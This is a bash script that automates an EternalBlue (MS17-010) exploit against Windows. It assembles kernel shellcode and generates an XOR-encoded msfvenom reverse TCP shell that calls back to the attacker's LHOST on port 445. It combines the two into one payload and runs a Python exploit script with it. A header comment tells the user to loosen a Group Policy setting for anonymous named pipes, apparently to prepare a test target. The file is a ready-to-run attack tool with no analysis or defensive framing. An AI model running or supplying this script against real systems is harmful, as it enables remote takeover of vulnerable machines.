#!/bin/bash
# 
# Group Policy Change Requirements
# Computer Configuration > Windows System > Security Settings > Local Policies > Security Options
# Set "Network access: Named Pipes that can be accessed anonymously" to "netlogon, samr, browser, spoolss, lsarpc"
# (no quotes)

set -euxo pipefail

LHOST="${LHOST:-}"
if [ -z "$LHOST" ]; then
    echo -e "LHOST not specified"
    exit
fi

pushd shellcode

find -name '*.bin' -exec rm {} \;

# Compile the initial access sploit
nasm -f bin eternalblue_kshellcode_x64.asm -o ./kernel_x64.bin
# nasm -f bin eternalblue_kshellcode_x64.asm -o /dev/stdout | msfvenom -p - -f raw --platform windows -a x64 -e x64/xor_dynamic -i 15 -o ./kernel_x64.bin

# Generate a payload for callback
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=445 -f raw --platform windows -a x64 -e x64/xor_dynamic -i 15 -o ./msf_x64.bin

# combine
cat kernel_x64.bin msf_x64.bin > x64_payload.bin

popd 

# Sploit!
python2 eternalblue_exploit8.py $LHOST ./shellcode/x64_payload.bin

